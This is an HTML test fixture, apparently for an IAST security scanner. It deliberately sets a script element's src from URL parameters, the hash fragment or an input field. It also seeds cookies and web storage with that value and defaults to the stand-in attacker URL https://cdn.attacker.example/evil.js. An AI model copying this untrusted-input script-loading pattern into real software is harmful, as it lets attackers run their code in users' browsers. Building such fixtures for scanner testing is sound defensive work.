<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>IAST Dynamic Script Loading</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: system-ui, -apple-system, sans-serif; margin: 0; padding: 24px; background: #0f172a; color: #e2e8f0; }
    h1 { margin-top: 0; }
    .card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
    label { display: block; margin: 8px 0 4px; color: #cbd5e1; }
    input, button { width: 100%; border-radius: 10px; border: 1px solid #1f2937; padding: 10px; background: #0b1220; color: #e2e8f0; }
    button { cursor: pointer; font-weight: 600; background: #2563eb; border: none; margin-top: 8px; }
    button:hover { background: #1d4ed8; }
    .note { color: #94a3b8; font-size: 0.9rem; }
    .log { font-size: 0.9rem; background: #0b1220; border: 1px dashed #1f2937; border-radius: 12px; padding: 12px; min-height: 70px; }
  
    .back-link {
      display: inline-block;
      margin-bottom: 12px;
      color: #93c5fd;
      text-decoration: none;
      font-weight: 600;
    }
    .back-link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <a class="back-link" href="index.html">← Back to index</a>
  <h1>IAST Dynamic Script Loading Fixture</h1>
  <p class="note">Exercises <code>HTMLScriptElement.src</code> assignments for the shipped dangerous-URL coverage and the full <code>iast_dynamic_import_loading</code> loader-path rules.</p>

  <div class="card">
    <label for="script-url">Script URL</label>
    <input id="script-url" type="text" placeholder="https://cdn.attacker.example/evil.js">
    <button id="prime">Prime taint sources</button>
    <p class="note">Fill via ?url=..., hash fragment, or the field above then click prime.</p>
  </div>

  <div class="card">
    <button id="btn-append">Create &amp; append &lt;script&gt;</button>
    <button id="btn-reuse">Reuse existing script element</button>
    <div id="log" class="log"></div>
  </div>

  <script>
    function getParam(name) {
      const params = new URLSearchParams(location.search);
      return params.get(name) || '';
    }

    function getHash() {
      return location.hash ? decodeURIComponent(location.hash.slice(1)) : '';
    }

    function primeSources(value) {
      if (!value) return;
      document.cookie = 'iast_payload=' + encodeURIComponent(value) + '; path=/';
      localStorage.setItem('iast_payload', value);
      sessionStorage.setItem('iast_payload', value);
      window.name = value;
    }

    const urlField = document.getElementById('script-url');
    const log = document.getElementById('log');
    urlField.value = getParam('url') || getHash() || 'https://cdn.attacker.example/evil.js';

    const baseScript = document.createElement('script');
    baseScript.id = 'reusable-script';
    document.body.appendChild(baseScript);

    function logMessage(msg) {
      log.textContent = msg;
    }

    document.getElementById('prime').onclick = () => {
      primeSources(urlField.value);
      alert('Taint primed for script URL.');
    };

    document.getElementById('btn-append').onclick = () => {
      const script = document.createElement('script');
      script.src = urlField.value;
      document.body.appendChild(script);
      logMessage('Created new <script> with tainted src.');
    };

    document.getElementById('btn-reuse').onclick = () => {
      baseScript.src = urlField.value;
      logMessage('Updated existing script.src with tainted value.');
    };
  </script>
</body>
</html>
